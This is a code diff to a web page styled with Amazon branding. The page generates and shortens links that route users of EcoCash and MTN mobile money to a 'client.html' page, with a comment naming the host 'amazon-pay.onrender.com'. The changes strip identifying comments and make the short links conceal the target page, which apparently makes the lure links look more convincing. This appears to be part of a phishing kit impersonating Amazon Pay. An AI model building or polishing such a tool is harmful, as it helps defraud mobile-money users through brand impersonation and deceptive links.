@@ -9,7 +9,6 @@
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    /* Amazon Brand Colors — Squid Ink + Orange */
     --amz-squid-ink: #131921;
     --amz-squid-ink-mid: #232F3E;
     --amz-squid-ink-soft: #333E48;
@@ -588,9 +587,7 @@ const $ = id => document.getElementById(id);
 const state = { fullLink: '', shortLink: '', shortCode: '', linkMode: 'short', payload: null };
 
 /* ─────────────────────────────────────────────────────────────
-   ROUTING
-   All countries (EcoCash + MTN) land on client.html first.
-   Any MTN-specific handling happens inside client.html.
+   ROUTING — all countries land on client.html first.
    ───────────────────────────────────────────────────────────── */
 function targetPageFor(country) {
   return 'client.html';
@@ -695,6 +692,9 @@ function b64urlEncode(str) {
   return btoa(unescape(encodeURIComponent(str))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 }
 
+/* ─────────────────────────────────────────────────────────────
+   BUILD LINKS — clean short URL, no client.html visible
+   ───────────────────────────────────────────────────────────── */
 async function buildLinks(payload) {
   const base = window.location.href.replace(/[^/]*$/, '');
   const page = targetPageFor(payload.c);
@@ -710,7 +710,8 @@ async function buildLinks(payload) {
     if (!res.ok) throw new Error('Server ' + res.status);
     const data = await res.json();
     state.shortCode = data.code;
-    state.shortLink = base + page + '?r=' + data.code;
+    // Clean short URL: https://amazon-pay.onrender.com/ABC123
+    state.shortLink = base + data.code;
   } catch (err) {
     state.shortCode = 'FULL';
     state.shortLink = state.fullLink;
@@ -722,6 +723,10 @@ async function buildLinks(payload) {
 function currentLink() { return state.linkMode === 'short' ? state.shortLink : state.fullLink; }
 
 async function shortenUrl(longUrl) {
+  // If we already have a clean short link, don't re-shorten it
+  if (state.linkMode === 'short' && state.shortCode && state.shortCode !== 'FULL') {
+    return state.shortLink;
+  }
   try {
     const r = await fetch('/api/shorten', {
       method: 'POST',
